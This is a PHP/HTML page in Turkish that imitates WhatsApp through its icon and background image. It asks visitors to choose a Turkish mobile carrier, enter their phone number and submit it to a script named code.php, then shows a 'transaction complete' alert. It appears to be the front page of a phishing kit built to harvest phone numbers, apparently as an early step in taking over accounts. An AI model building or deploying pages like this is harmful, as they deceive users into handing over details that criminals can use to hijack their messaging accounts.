<?php 
error_reporting(0); 
if (isset($_GET["id"])) {
	echo "<script>alert('İşleminiz gerçekleşti.');</script>";
}


 ?>

<!doctype html>
<html lang="tr">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1200px-WhatsApp.svg.png">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
    <title>Hoş Geldiniz</title>
  </head>
  <body style="background-image: url('http://www.allwhitebackground.com/images/7/WhatsApp-Background-High-Quality-Image.jpg');  background-repeat: no-repeat;
  background-attachment: fixed;
  background-position: center;height: 100%;width: 100%;" bgcolor="black">
  	<div class="container ">
  		<div class="row mt-5">
  		<div class="col-md-12 col-12">
  			<center>
  			<div class="card bg-dark col-12"  style="opacity: 0.9">
  				<div class="card-body">
  					<p class="text-danger font-weight-bold">Lütfen bilgilerinizi eksiksiz giriniz!</p>
  					<form method="POST" action="code.php">
  						<div class="form-row col-12">
  						<div class="form-group col-md-12 text-white pt-5">
  							<select class="form-control" required="">
  								<option>Turkcell</option>
  								<option>Vodofone</option>
  								<option>Turk Telekom</option>
  							</select>
  							</div>
  						</div>
  						<div class="form-row">
  							<div class="form-group col-md-12 text-white pt-1 ml-1">
  								<label>Telefon Numarası</label>
  								<input type="text" name="telnumber" class="form-control input-sm" required="" placeholder="+90" value="" minlength="11" maxlength="13" > 
  							</div>
  							<div class="form-row col-12">
  								<button type="submit" class="btn btn-outline-success  btn-block ">Devam</button>
  							</div>
  							
  						</div>
  					</form>
  				</div>
  			</div>
  		</div>	
  		</center>
  		</div>
  	</div>

    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
  </body>
</html>